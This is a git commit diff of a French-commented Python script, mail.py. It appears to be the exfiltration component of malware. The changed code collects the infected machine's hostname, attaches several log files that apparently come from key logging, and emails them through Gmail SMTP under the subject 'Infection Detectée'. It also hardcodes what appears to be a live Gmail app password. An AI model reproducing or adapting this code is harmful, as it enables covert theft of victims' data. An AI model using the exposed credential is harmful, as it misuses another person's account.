19c31d2a9b105ea2dd52c0880d606bdbde61e42c
william <136432112+oxo140@users.noreply.github.com>
2025-03-19 12:02:56 +0100

    Update mail.py

--- mail.py
+++ mail.py
@@ -1,14 +1,18 @@
 import smtplib
+import socket
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
 
+# Récupérer le nom de la machine
+hostname = socket.gethostname()
+
 # Configurer l'e-mail
 from_email = "votre_email@gmail.com"
 to_email = "adresse@destinataire.com"
-subject = "Test avec pièce jointe"
-body = "Ceci est un test avec une pièce jointe."
+subject = f"Infection Detectée ({hostname})"  # Ajouter le nom de la machine dans le sujet
+body = "Rapport infection"
 
 # Créer l'objet MIME
 msg = MIMEMultipart()
@@ -19,23 +23,33 @@ msg['Subject'] = subject
 # Ajouter le corps du message
 msg.attach(MIMEText(body, 'plain'))
 
-# Ajouter la pièce jointe
-filename = "NBCLE.txt"  # Nom du fichier à joindre
-attachment = open(filename, "rb")
+# Liste des fichiers à joindre
+files_to_attach = ["NBCLE.txt", "logdecle.txt", "LOG.txt"]
 
-part = MIMEBase('application', 'octet-stream')
-part.set_payload(attachment.read())
-encoders.encode_base64(part)
-part.add_header('Content-Disposition', f"attachment; filename= {filename}")
-
-msg.attach(part)
+# Ajouter les fichiers en pièce jointe
+for filename in files_to_attach:
+    try:
+        attachment = open(filename, "rb")  # Ouvrir le fichier en mode lecture binaire
+        part = MIMEBase('application', 'octet-stream')
+        part.set_payload(attachment.read())
+        encoders.encode_base64(part)
+        part.add_header('Content-Disposition', f"attachment; filename= {filename}")
+        msg.attach(part)
+        attachment.close()  # Fermer le fichier après l'ajout
+    except Exception as e:
+        print(f"Erreur lors de l'ajout du fichier {filename}: {e}")
 
 # Configuration du serveur SMTP
 server = smtplib.SMTP('smtp.gmail.com', 587)
-server.starttls()
-server.login(from_email, 'votre_mot_de_passe_d_application')
+server.starttls()  # Sécuriser la connexion
+server.login(from_email, 'gzdd ejec tmxw zqdx')
 text = msg.as_string()
 
 # Envoi de l'e-mail
-server.sendmail(from_email, to_email, text)
-server.quit()
+try:
+    server.sendmail(from_email, to_email, text)
+    print("E-mail envoyé avec succès.")
+except Exception as e:
+    print(f"Erreur lors de l'envoi de l'e-mail: {e}")
+finally:
+    server.quit()  # Fermer la connexion SMTP
